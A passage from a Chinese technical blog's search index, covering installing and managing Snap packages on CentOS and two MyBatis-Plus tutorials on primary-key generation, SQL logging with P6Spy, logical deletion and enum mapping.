的系统上，而且支持用户在同一个系统中安装同一应用程序的多个版本。使用 Snap 包的好处就是它解决了应用程序之间的依赖问题，使应用程序之间更容易管理，但是由此带来的问题就是占用更多的磁盘空间。类似的应用程序容器技术还有大名鼎鼎的 Flatpak、AppImage。Snap 适用于 CentOS 7.6+ 和 Red Hat Enterprise Linux 7.6+，它很好地弥补了 Centos 桌面软件资源不多的缺点，可以从 Extra Packages for Enterprise Linux（EPEL）存储库安装。Snap 的工作原理如下图所示： Snap 安装 12345678910111213141516171819202122232425262728293031323334353637383940414243# 安装EPEL源# yum install epel-release# 添加copr仓库（可选）# yum install yum-plugin-copr# yum copr enable ngompa/snapcore-el7# 安装Snap# yum install snapd# 安装Snap的其他组件（可选）# yum install snapd-glib snapd-qt snapd-qt-qmlg# 启用通信套接字# systemctl enable --now snapd.socket# 创建软链接# ln -s /var/lib/snapd/snap /snap# 注销并重新登录，或者重新启动系统# reboot# 查看Snap的运行状态# systemctl status snapd# 如果Snap处于关闭状态，则手动启动它# systemctl start snapd# 添加环境变量# vim /etc/profileexport PATH=$PATH:/snap/bin# 使环境变量生效# source /etc/profile# 验证是否运行正常# snap install hello# 如果运行正常，执行hello会输出"Hello, world!"# hello# 或者安装andy-testsnap-py测试工具# snap install andy-testsnap-py --edge Snap 常用命令 1234567891011121314151617181920212223242526272829303132333435363738# 列出所有已安装的应用# snap list# 查找应用# snap find hello# 查询应用的详细信息# snap info hello# 安装应用# snap install hello# 指定仓库安装应用（可选仓库：edge、beta、candidate、stable）# snap install hello --channel=stable# 运行应用（或者直接执行：hello）# snap run hello# 卸载应用（包括所有版本）# snap remove hello# 卸载特定版本的应用# snap remove hello --revision 352# 更新所有应用# snap refresh all# 更新特定的应用# snap refresh hello# 回滚特定应用到上一个版本# snap revert hello# 查看任务执行的历史记录# snap changes# 终止正在执行的特定任务# snap abort task-id Snap-Store 安装 Snapcraft 应用商店提供了所有 Snap 应用程序，同时 Snap 官方提供了商店应用 Snap-Store，支持在本地使用图形界面的方式管理 Snap 应用程序，包括安装、卸载、搜索 Snap 应用程序等。点击查看 Snap-Store 的实际运行效果图。 12345678910111213141516171819202122232425# 安装# snap install snap-store# 创建快捷方式# vim /usr/share/applications/snap-store.desktop[Desktop Entry]Name[zh_CN]=Snap 商店Name=Snap StoreComment[zh_CN]=添加、移除或更新计算机软件Comment=Add, remove or update software on this computerIcon=/snap/snap/snap-store/current/meta/gui/io.snapcraft.Store.pngExec=/snap/bin/snap-store %UTerminal=falseType=ApplicationCategories=GNOME;GTK;System;PackageManager;Keywords=Updates;Upgrade;Sources;Repositories;Preferences;Install;Uninstall;Program;Software;App;Store;Snap;StartupNotify=trueMimeType=x-scheme-handler/appstream;x-scheme-handler/snap;X-GNOME-UsesNotifications=trueDBusActivatable=false# 导航到：应用程序 --&gt; 系统工具 --&gt; Snap 商店，直接点击快捷方式启动应用即可# 或者直接执行命令（使用普通用户权限）$ /snap/bin/snap-store Snap 相关目录介绍 1231. 通过snap安装应用程序后，其应用程序的安装文件所在目录为：/var/lib/snapd/snap2. 普通用户的snap应用文件所在目录：~/snap3. snapd的安装目录：/var/lib/snapd Snap 更改默认安装目录 Snap 安装使用后比较占用磁盘空间（默认安装目录为 /var/lib/snapd），如果希望 Snap 安装在特定的目录，此时不能使用创建软链接的方法（ln -s）来关联到新的安装目录，否则 Snap 的应用将无法正常启动。正确的做法是使用 mount --bind 命令将新的安装目录挂载到 /var/lib/snapd 目录，具体可参考以下教程或者 Shell 脚本（建议执行 Shell 脚本之前先关闭 snapd 服务和卸载 snapd 的 /dev/loopxx 设备）。提示，/var/snap 目录千万不要移动，该目录一般情况下不需要做任何处理。 Move snap packages to another location/directory Where is a snap stored and how can I change that? 123456789101112131415161718192021222324252627282930313233343536373839404142434445############################################################################### Take Care this section may break the System !!!############################################################################### Move snap folder to Home instead of root# Create the directory, you can change the locationmkdir /home/$USER/snap/snapd# Copy the datasudo rsync -avzP /var/lib/snapd/ /home/$USER/snap/snapd/# Do backupssudo cp /etc/fstab /etc/fstab.baksudo mv /var/lib/snapd /var/lib/snapd.bak# Change fstab (Change $USER with your name or change the path totally)sudo echo "/home/$USER/snap/snapd /var/lib/snapd none bind 0 0" | sudo tee -a /etc/fstab# remount fstab or reboot.sudo mkdir /var/lib/snapdsudo mount -aif ls /var/lib/snapd/ | grep snapsthen echo "Re-mounting snapd folder is done successfully !!!!" sudo rm -rf /etc/fstab.bak sudo rm -rf /var/lib/snapd.bakelse echo "WARNING : Re-mounting snapd folder failed, please revert !!!!" # trying to revert automatically sudo cp /etc/fstab.bak /etc/fstab sudo mount -a sudo umount /var/lib/snapd sudo mv /var/lib/snapd.bak /var/lib/snapd echo "Revert automatically is done successfully !!!!"fi############################################################################### Take Care the pervious section may break the System !!!############################################################################## Snap 输出调试信息 12345678910111213# 编辑Snap服务的配置文件，添加以下内容（环境变量）# systemctl edit snapd.service[Service]Environment=SNAPD_DEBUG=1 SNAPD_DEBUG_HTTP=7# 使配置文件生效# systemctl daemon-reload# 重启服务# systemctl restart snapd.service# 打印Snap服务的日志信息# journalctl -xeu snapd 解决 Snap 下载网速慢的问题 123456789101112131415161718# 方法一（使用代理）# 编辑Snap服务的配置文件，添加以下内容（环境变量）# systemctl edit snapd.service[Service]Environment=http_proxy=127.0.0.1:1080Environment=https_proxy=127.0.0.1:1080# 使配置文件生效# systemctl daemon-reload# 重启服务# systemctl restart snapd.service# 方法二（离线安装）# 打开浏览器前往 https://uappexplorer.com/snaps 搜索并下载需要的snap包# 执行本地安装命令：snap install xxx.snap --dangerous 解决 Snap 应用程序无法卸载的问题 1234567891011# 举例说明：假如应用程序core无法卸载，可先取消挂载对应的/dev/loopxx设备，然后再执行卸载操作# 查看snap设备的挂载情况# df -h | grep snap/dev/loop1 90M 90M 0 100% /usr/var/lib/snapd/snap/core/7713# 取消设备挂载# umount /dev/loop1# 卸载应用# snap remove core Snapcraft 打包构建 Snap 应用程序 Snapcraft 可以用来构建 Snap 的应用程序，使用也非常的简单，仅仅需要写一个 snapcraft.yaml 的配置文件即可，作用类似 Docker 的 docker-file，具体的打包教程可参考这里。 参考博客 Linux 安装模式 AppImage,Flatpak,Snap 整理 Ubuntu 18.04 及 Snap 体验 — 让 Linux 入门更简单 真有用？Snap 和 Flatpak 通吃所有发行版的打包方式 三款新星 Linux 解决方案：Snappy、Flatpak 和 AppImage var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"MyBatis-Plus 入门教程之五",url:"/posts/c5f15a9c.html",text:'大纲 MyBatis-Plus 入门教程之一 MyBatis-Plus 入门教程之二 MyBatis-Plus 入门教程之三 MyBatis-Plus 入门教程之四 MyBatis-Plus 入门教程之五 MyBatis-Plus 入门教程之六 MyBatis-Plus 入门教程之七 前言版本说明本文的教程内容是基于 MyBatis-Plus 3.5.2 版本编写的，若你使用的是 2.x 或其他版本，可能会有部分知识点、案例代码不兼容，一切以 MyBatis-Plus 官方文档为准。 MyBatis-Plus 主键生成策略主键生成策略 使用方式：在实体类的主键属性上添加注解 @TableId(type = IdType.AUTO)，或者在全局配置文件中通过 idType 属性指定 MyBatis-Plus 的主键生成策略 主键生成策略 描述 AUTO 数据库 ID 自增，该类型必须确保数据库表的主键字段设置了 ID 自增，否则无法生效 NONE 无状态，该类型为未设置主键类型（注解里等于跟随全局，全局里约等于 INPUT） INPUT 用户自行设置主键值，该类型可以通过自己注册自动填充插件进行填充 ASSIGN_ID 分配 ID，主键类型为 Number [Long 和 Integer] 或 String（@since 3.3.0 version），使用的是 IdentifierGenerator 接口的 nextId 方法（默认实现类为 DefaultIdentifierGenerator，使用的是雪花算法） ASSIGN_UUID 分配 UUID，主键类型为 String（@since 3.3.0 version），使用的是 IdentifierGenerator 接口的 nextUUID 方法 ID_WORKER 分布式全局唯一 ID 长整型类型（请使用 ASSIGN_ID） UUID 32 位 UUID 字符串（请使用 ASSIGN_UUID） ID_WORKER_STR 分布式全局唯一 ID 字符串类型（请使用 ASSIGN_ID） 注意 1、AUTO 主键类型必须确保数据库表的主键字段设置了 ID 自增，否则无法生效 2、ASSIGN_ID 主键类型（使用雪花算法生成 ID），与数据库表的主键字段是否设置 ID 自增没有任何关系 3、ASSIGN_ID 和 ASSIGN_UUID 这两种主键类型，只有当插入对象的 ID 为空时，才会自动填充主键值 Sequence 序列生成器对于 INPUT 类型的主键生成策略，一种情况是程序里面自己指定主键，另一种是利用 MyBatis-Plus 内置的序列生成器来生成主键。由于不是所有数据库都像 MySQL 一样支持自增主键，例如在 Oracle 数据库中就不支持主键自增长，它是通过 Sequence 序列来获取主键的，MyBatis-Plus 为了解决该问题提供了序列生成器。MyBatis-Plus 内置支持以下序列生成器，如果内置支持不满足你的需求，可实现 IKeyGenerator 接口来进行扩展。 DB2KeyGenerator H2KeyGenerator KingbaseKeyGenerator OracleKeyGenerator PostgreKeyGenerator Oracle 主键生成策略使用案例指定 Oracle 主键生成策略的步骤 1、实体类添加 @KeySequence(value = "seq_employee", dbType = DbType.ORACLE) 注解，指定数据库中序列的名称 2、实体类属性添加 @TableId 注解，指定主键生成策略为 IdType.INPUT，或者在配置文件中全局指定 MyBatis-Plus 的主键生成策略为 IdType.INPUT 3、注入 com.baomidou.mybatisplus.extension.incrementer.OracleKeyGenerator 序列生成器到 Spring 容器中 初始化数据库1234567891011-- 创建表CREATE TABLE t_employee(id number(11) primary key, last_name varchar(255) DEFAULT NULL, gender char(1) DEFAULT NULL, email varchar(255) DEFAULT NULL, age number DEFAULT NULL);-- 创建序列create sequence seq_employee start with 100 increment by 2;-- 插入数据insert into t_employee(id, last_name, gender, email, age) values(1, \'Jim\',\'1\', \'jim@gmail.com\', 26);insert into t_employee(id, last_name, gender, email, age) values(2, \'Peter\',\'1\', \'peter@gmail.com\', 29);insert into t_employee(id, last_name, gender, email, age) values(3, \'David\',\'1\', \'david@gmail.com\', 28);insert into t_employee(id, last_name, gender, email, age) values(4, \'Tom\',\'1\', \'tom@gmail.com\', 25); 引入 Oracle 依赖由于 Oracle 授权的问题，不能直接从 Maven 的仓库中下载到 Oracle 驱动。为了简单演示，这里直接将驱动包存放在项目的 lib 目录中，然后通过本地文件的方式引用，其他引入方式可以看 这里。 12345678910&lt;!-- Oracle 11g 驱动 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;oracle&lt;/groupId&gt; &lt;artifactId&gt;ojdbc6&lt;/artifactId&gt; &lt;version&gt;11.2.0.2.0&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${project.basedir}/lib/ojdbc6.jar&lt;/systemPath&gt; &lt;/dependency&gt;&lt;/dependencies&gt; Oracle 数据库连接信息1234driver-class-name: oracle.jdbc.OracleDriverurl: jdbc:oracle:thin:@localhost:1521:xeusername: systempassword: oracle @KeySequence 注解指定序列名称指定序列名称，在实体类上添加 @KeySequence 注解，value 属性是 Oracle 数据库中序列的名称，dbType 属性是数据库的类型，完整的数据库类型列表可查看 DbType 类的源码注释。 12345678910111213141516@KeySequence(value = "seq_employee", dbType = DbType.ORACLE)public class Employee { private Long id; private String email; private String lastName; private String gender; private Integer age; ....} 指定主键生成策略@TableId 注解方式指定主键生成策略，在实体类的主键属性上添加 @TableId 注解，type 属性必须为 IdType.INPUT 1234567891011121314151617@KeySequence(value = "seq_employee", dbType = DbType.ORACLE)public class Employee { @TableId(type = IdType.INPUT) private Long id; private String email; private String lastName; private String gender; private Integer age; ....} 全局配置文件方式除了可以使用 @TableId 注解单独指定主键生成策略外，还可以在配置文件中全局指定 MyBatis-Plus 的主键生成策略。 Spring XML 配置文件1234567891011&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="globalConfig" ref="globalConfig"&gt;&lt;/property&gt;&lt;/bean&gt;&lt;bean id="globalConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig"&gt; &lt;property name="dbConfig" ref="dbConfig" /&gt;&lt;/bean&gt;&lt;bean id="dbConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig.DbConfig"&gt; &lt;property name="idType" value="INPUT"&gt;&lt;/property&gt;&lt;/bean&gt; SpringBoot 配置文件1234mybatis-plus: global-config: db-config: id-type: INPUT 注入序列生成器将 Oracle 的序列生成器注入到 Spring 容器中。 Spring XML 配置文件123456789101112131415&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="globalConfig" ref="globalConfig"&gt;&lt;/property&gt;&lt;/bean&gt;&lt;bean id="globalConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig"&gt; &lt;property name="dbConfig" ref="dbConfig"/&gt;&lt;/bean&gt;&lt;bean id="dbConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig.DbConfig"&gt; &lt;!-- 注入序列生成器 --&gt; &lt;property name="keyGenerator" ref="keyGenerator"/&gt;&lt;/bean&gt;&lt;!-- 定义序列生成器 --&gt;&lt;bean id="keyGenerator" class="com.baomidou.mybatisplus.extension.incrementer.OracleKeyGenerator"/&gt; SpringBoot 配置类12345678910@Configuration@MapperScan("com.clay.mybatis.dao")public class MybatisPlusConfig { @Bean public IKeyGenerator keyGenerator() { return new OracleKeyGenerator(); }} Oracle 多个表共用一个序列在特殊的业务场景下，若希望多个数据库表共用一个 Sequence 序列，那么可以将 @keySequence 注解定义在父类中，这样就可以实现多个子类对应的多个表共用一个 Sequence 序列。 实体父类 1234@KeySequence(value = "seq_employee", dbType = DbType.ORACLE)public abstract class BaseEntity {} 实体子类 12345678910111213141516public class Employee extends BaseEntity { @TableId(type = IdType.INPUT) private Long id; private String email; private String lastName; private String gender; private Integer age; ....} MyBatis-Plus 自定义 ID 生成器若 MyBatis-Plus 提供的主键生成策略不能满足业务需求，则可以自定义 MyBatis-Plus 的 ID 生成器，例如使用分布式全局唯一 ID 方案来生成主键。 自定义 ID 生成器的步骤 1、实现 IdentifierGenerator 接口 2、将自定义 ID 生成器类注入到 Spring 容器中 自定义 ID 生成器1234567891011public class CustomIdGenerator implements IdentifierGenerator { @Override public Long nextId(Object entity) { // 可以将当前传入的class全类名来作为bizKey，或者提取参数来生成bizKey进行分布式ID调用生成 String bizKey = entity.getClass().getName(); // 根据bizKey调用分布式ID生成 long id = ....; // 返回生成的id值即可 return id; }} 注入自定义 ID 生成器Spring XML 配置文件123456789&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="globalConfig" ref="globalConfig"&gt;&lt;/property&gt;&lt;/bean&gt;&lt;bean id="globalConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig"&gt; &lt;property name="identifierGenerator" ref="customIdGenerator"/&gt;&lt;/bean&gt;&lt;bean name="customIdGenerator" class="com.clay.mybatis.incrementer.CustomIdGenerator"/&gt; SpringBoot 配置类12345678910@Configuration@MapperScan("com.clay.mybatis.dao")public class MybatisPlusConfig { @Bean public IdentifierGenerator idGenerator() { return new CustomIdGenerator(); }} MyBatis-Plus 执行 SQL 分析打印值得一提的是，执行 SQL 分析打印会产生性能损耗，不建议在生产环境使用。 普通打印方式使用案例在 SpringBoot 的 YML 配置文件中，指定 MyBatis-Plus 的 log-impl 配置参数 1234mybatis-plus: # MyBatis 原生配置 configuration: log-impl: org.apache.ibatis.logging.stdout.StdOutImpl 打印结果12322:16:13,481 DEBUG getById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?22:16:13,521 DEBUG getById:137 - ==&gt; Parameters: 1(Long)22:16:13,570 DEBUG getById:137 - &lt;== Total: 1 可以发现上述的打印方式，不会自动替换 SQL 中的 ? 符号为真实参数值 P6Spy 打印方式使用案例引入 Maven 依赖MyBatis-Plus 执行 SQL 分析打印需要依赖 P6Spy 主组件。 12345&lt;dependency&gt; &lt;groupId&gt;p6spy&lt;/groupId&gt; &lt;artifactId&gt;p6spy&lt;/artifactId&gt; &lt;version&gt;3.9.1&lt;/version&gt;&lt;/dependency&gt; 数据库连接配置提示 driver-class-name 为 P6Spy 提供的驱动类 url 前缀为 jdbc:p6spy，后面跟着冒号为对应数据库的连接地址 12345spring: datasource: driver-class-name: com.p6spy.engine.spy.P6SpyDriver url: jdbc:p6spy:mysql://127.0.0.1:3306/mybatis_plus_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC ... 创建 P6Spy 配置文件在项目的 src/main/resources 目录下创建 spy.properties 配置文件，内容如下： 123456789101112131415161718192021222324# 3.2.1版本以上使用modulelist=com.baomidou.mybatisplus.extension.p6spy.MybatisPlusLogFactory,com.p6spy.engine.outage.P6OutageFactory# 3.2.1版本以下使用或者不配置# modulelist=com.p6spy.engine.logging.P6LogFactory,com.p6spy.engine.outage.P6OutageFactory# 自定义日志打印logMessageFormat=com.baomidou.mybatisplus.extension.p6spy.P6SpyLogger# 日志输出到控制台appender=com.baomidou.mybatisplus.extension.p6spy.StdoutLogger# 使用日志系统记录 SQL# appender=com.p6spy.engine.spy.appender.Slf4JLogger# 设置 p6spy driver 代理deregisterdrivers=true# 取消JDBC URL前缀useprefix=true# 配置记录 Log 例外，可去掉的结果集有 error，info，batch，debug，statement，commit，rollback，result，resultsetexcludecategories=info,debug,result,commit,resultset# 日期格式dateformat=yyyy-MM-dd HH:mm:ss# 实际驱动可多个# driverlist=org.h2.Driver# 是否开启慢SQL记录outagedetection=true# 慢SQL记录标准 2 秒outagedetectioninterval=2 提示 P6Spy 详细的配置内容请看 这里。 日志打印结果简单执行 CRUD 操作后，MyBatis-Plus 打印的日志信息如下： 12345678==&gt; Preparing: SELECT id,email,last_name,gender,age FROM t_employee WHERE id=?==&gt; Parameters: 1(Long) Consume Time：2 ms 2022-09-17 19:38:30 Execute SQL：SELECT id,email,last_name,gender,age FROM t_employee WHERE id=1 &lt;== Columns: id, email, last_name, gender, age&lt;== Row: 1, empty@gmai.com, Clion, 1, 26&lt;== Total: 1 可以发现 P6Spy 组件会打印出完整的 SQL 语句和执行 SQL 语句所耗费的时间，而且它会自动替换 SQL 中的 ? 为真实参数值并输出。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"MyBatis-Plus 入门教程之四",url:"/posts/2cbf33d2.html",text:'大纲 MyBatis-Plus 入门教程之一 MyBatis-Plus 入门教程之二 MyBatis-Plus 入门教程之三 MyBatis-Plus 入门教程之四 MyBatis-Plus 入门教程之五 MyBatis-Plus 入门教程之六 MyBatis-Plus 入门教程之七 前言版本说明本文的教程内容是基于 MyBatis-Plus 3.5.2 版本编写的，若你使用的是 2.x 或其他版本，可能会有部分知识点、案例代码不兼容，一切以 MyBatis-Plus 官方文档为准。 MyBatis-Plus 逻辑删除逻辑删除介绍 只对自动注入的 SQL 生效 插入：没有任何限制 删除：会转变为 SQL 更新语句，例如：update user set deleted = 1 where id = 1 and deleted = 0 查找：会追加 where 条件过滤掉已删除的数据，且使用 wrapper.entity 生成的 where 条件会忽略该字段，例如：select id, name, deleted from user where deleted = 0 更新：会追加 where 条件防止更新到已删除的数据，且使用 wrapper.entity 生成的 where 条件会忽略该字段，例如：update user set age = 23 where id = 1 and deleted = 0 字段类型支持说明 支持所有数据类型（推荐使用 Integer、Boolean、LocalDateTime 数据类型） 如果数据库表字段使用 datetime，逻辑未删除值和已删除值支持配置为字符串 null，另一个值支持配置为函数来获取值（例如 now()） 提示 逻辑删除是为了方便数据恢复和保护数据本身价值的一种方案，但实际就是删除 如果业务上需要频繁将数据查出来显示，那么就不应使用逻辑删除，而是应该以一个状态去表示数据记录的状态 逻辑删除使用案例本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-10。 逻辑删除的配置步骤 1、在实体类的属性上添加 @TableLogic 注解 2、使用 Spring XML 配置文件或者 SpringBoot 配置文件的任意一种方式来配置 MyBatis-Plus 的逻辑删除 创建数据库表12345678910-- 创建数据库表CREATE TABLE `t_department` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) DEFAULT NULL, `deleted` int DEFAULT 0, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;-- 插入表数据insert into t_department(id, name, deleted) values(1, \'开发部门\', 0), (2, \'测试部门\', 0), (3, \'产品部\', 1); 添加 @TableLogic 注解在实体类的属性上添加 @TableLogic 注解 123456789101112public class Department { private Long id; private String name; @TableLogic private Integer deleted; ...} 更改项目的配置文件Spring XML 配置文件12345678910111213141516&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="globalConfig" ref="globalConfig"&gt;&lt;/property&gt;&lt;/bean&gt;&lt;bean id="globalConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig"&gt; &lt;property name="dbConfig" ref="dbConfig" /&gt;&lt;/bean&gt;&lt;bean id="dbConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig.DbConfig"&gt; &lt;!-- 全局逻辑删除的实体属性名（since 3.3.0，配置后实体类属性可以不单独配置 @TableLogic 注解）--&gt; &lt;!-- &lt;property name="logicDeleteField" value="deleted" /&gt; --&gt; &lt;!-- 逻辑已删除值（默认为 1）--&gt; &lt;property name="logicDeleteValue" value="1" /&gt; &lt;!-- 逻辑未删除值（默认为 0）--&gt; &lt;property name="logicNotDeleteValue" value="0" /&gt;&lt;/bean&gt; SpringBoot 配置文件123456mybatis-plus: global-config: db-config: # logic-delete-field: deleted # 全局逻辑删除的实体属性名（since 3.3.0，配置后实体类属性可以不单独配置 @TableLogic 注解） logic-delete-value: 1 # 逻辑已删除值（默认为 1） logic-not-delete-value: 0 # 逻辑未删除值（默认为 0） Junit 单元测试代码123456/** * Mapper 接口 */public interface DepartmentMapper extends BaseMapper&lt;Department&gt; {} 123456789101112131415161718192021222324252627282930313233343536373839/** * Junit 测试代码 */@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private DepartmentMapper deptMapper; @Test public void select() { List&lt;Department&gt; list = deptMapper.selectList(null); list.forEach(System.out::println); } @Test public void selectByWrapper() { QueryWrapper&lt;Department&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.like("name", "测试"); List&lt;Department&gt; list = deptMapper.selectList(wrapper); list.forEach(System.out::println); } @Test public void delete() { int deleteResult = deptMapper.deleteById(1L); System.out.println("deleteResult: " + (deleteResult &gt; 0)); } @Test public void update() { Department department = new Department(); department.setName("行政部"); department.setId(1L); int updateResult = deptMapper.updateById(department); System.out.println("updateResult: " + (updateResult &gt; 0)); }} 执行上面的测试代码后，控制台输出的日志信息如下： 1234567891011121314151617181920==&gt; Preparing: SELECT id,name,deleted FROM t_department WHERE deleted=0==&gt; Parameters: &lt;== Columns: id, name, deleted&lt;== Row: 1, 开发部门, 0&lt;== Row: 2, 测试部门, 0&lt;== Total: 2==&gt; Preparing: SELECT id,name,deleted FROM t_department WHERE deleted=0 AND (name LIKE ?)==&gt; Parameters: %测试%(String)&lt;== Columns: id, name, deleted&lt;== Row: 2, 测试部门, 0&lt;== Total: 1==&gt; Preparing: UPDATE t_department SET deleted=1 WHERE id=? AND deleted=0==&gt; Parameters: 1(Long)&lt;== Updates: 1==&gt; Preparing: UPDATE t_department SET name=? WHERE id=? AND deleted=0==&gt; Parameters: 行政部(String), 1(Long)&lt;== Updates: 0 逻辑删除常见问题 如何插入数据？ 字段在数据库定义默认值（推荐） insert 前自己 set 值 使用 自动填充处理器 删除接口自动填充处理器失效 1、使用 deleteById 方法（推荐） 2、使用 update 方法，即 UpdateWrapper.set(column, value)（推荐） 3、使用 update 方法，即 UpdateWrapper.setSql("column=value") 4、使用 Sql 注入器 注入 com.baomidou.mybatisplus.extension.injector.methods.LogicDeleteByIdWithFill（3.5.0 版本已废弃，推荐使用 deleteById） MyBatis-Plus 通用枚举通用枚举介绍数据库表中有些字段的值是固定的，例如性别（男或女），此时可以使用 MyBatis-Plus 的通用枚举来实现，这样可以让 MyBatis 更优雅地使用枚举属性。 通用枚举使用案例本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-11。 通用枚举的配置步骤 1、在枚举类的属性上添加 @EnumValue 注解，或者让枚举类实现 IEnum 接口 2、MyBatis-Plus 3.5.2 以下的版本，需要配置枚举包扫描（局部方式），或者更改 MyBatis 默认使用的 EnumTypeHandler 枚举类型处理器（全局方式） 创建数据库表12345678910-- 创建数据库表CREATE TABLE `t_admin` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) DEFAULT NULL, `type` int DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;-- 插入表数据insert into t_admin(id, name, type) values(1, \'Alex\', 1); 添加 @EnumValue 注解在枚举类的属性上添加 @EnumValue 注解，MyBatis-Plus 在插入数据时，会将拥有 @EnumValue 注解的属性的值保存到数据库表里。 1234567891011121314151617181920212223public enum AdminType { ROOT(0, "Root"), ADMIN(1, "Admin"); @EnumValue private Integer value; private String description; public Integer getValue() { return this.value; } public String getDescription() { return this.description; } private AdminType(Integer value, String description) { this.value = value; this.description = description; }} 或者让枚举类实现 IEnum 接口，然后重写 getValue() 方法 1234567891011121314151617181920212223public enum AdminType implements IEnum&lt;Integer&gt; { ROOT(0, "Root"), ADMIN(1, "Admin"); private Integer value; private String description; @Override public Integer getValue() { return this.value; } public String getDescription() { return this.description; } private AdminType(Integer value, String description) { this.value = value; this.description = description; }} 配置枚举包扫描值得一提的是，从 MyBatis-Plus 3.5.2 版本开始，无需手动配置枚举包扫描。 局部方式当使用以下的方式配置枚举包扫描后，MyBatis-Plus 提供的 MybatisSqlSessionFactoryBean 会自动扫描包内合法的枚举类（使用了 @EnumValue 注解或者实现了 IEnum 接口），分别为这些枚举类注册使用 MybatisEnumTypeHandler。换句话说，只有指定包下的枚举类会使用新的 TypeHandler。其他包下，或者包内没有做相关改造的枚举类，仍然会使用 MyBatis 默认提供的 DefaultEnumTypeHandler。 Spring XML 配置文件1234&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean"&gt; &lt;!-- 枚举包扫描，支持通配符 * 或者 ; 分割 --&gt; &lt;property name="typeEnumsPackage" value="com.clay.mybatis.enums"/&gt;&lt;/bean&gt; SpringBoot 配置文件123mybatis-plus: # 枚举包扫描，支持通配符 * 或者 ; 分割 typeEnumsPackage: com.clay.mybatis.enums 全局方式此方式用来全局更改 MyBatis 默认使用的 EnumTypeHandler 枚举类型处理器。 Spring XML 配置文件12345678&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="configuration" ref="configuration"/&gt;&lt;/bean&gt;&lt;bean id="configuration" class="com.baomidou.mybatisplus.core.MybatisConfiguration"&gt; &lt;!-- 更改 MyBatis 的 DefaultEnumTypeHandler --&gt; &lt;property name="defaultEnumTypeHandler" value="com.baomidou.mybatisplus.core.handlers.MybatisEnumTypeHandler"&gt;&lt;/bean&gt; SpringBoot 配置文件1234mybatis-plus: # 更改 MyBatis 的 DefaultEnumTypeHandler configuration: default-enum-type-handler: com.baomidou.mybatisplus.core.handlers.MybatisEnumTypeHandler 通过 MybatisPlusPropertiesCustomizer 自定义12345678910111213141516@Configuration@MapperScan("com.clay.mybatis.dao")public class MybatisPlusConfig { @Bean public MybatisPlusPropertiesCustomizer mybatisPlusPropertiesCustomizer() { return properties -&gt; { GlobalConfig globalConfig = properties.getGlobalConfig(); globalConfig.setBanner(false); MybatisConfiguration configuration = new MybatisConfiguration(); // 更改 MyBatis 的 DefaultEnumTypeHandler configuration.setDefaultEnumTypeHandler(MybatisEnumTypeHandler.class); properties.setConfiguration(configuration); }; }} Junit 单元测试代码 实体类 1234567891011public class Admin { private Long id; private String name; private AdminType type; ...} Mapper 接口 123public interface AdminMapper extends BaseMapper&lt;Admin&gt; {} Junit 单元测试 12345678910111213141516171819202122@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private AdminMapper adminMapper; @Test public void insert() { Admin admin = new Admin(); admin.setName("David"); admin.setType(AdminType.ROOT); adminMapper.insert(admin); System.out.println(admin); } @Test public void select() { Admin admin = adminMapper.selectById(1L); System.out.println(admin); }} 执行上面的测试代码后，MyBatis-Plus 发出的 SQL 语句如下： 123456789==&gt; Preparing: INSERT 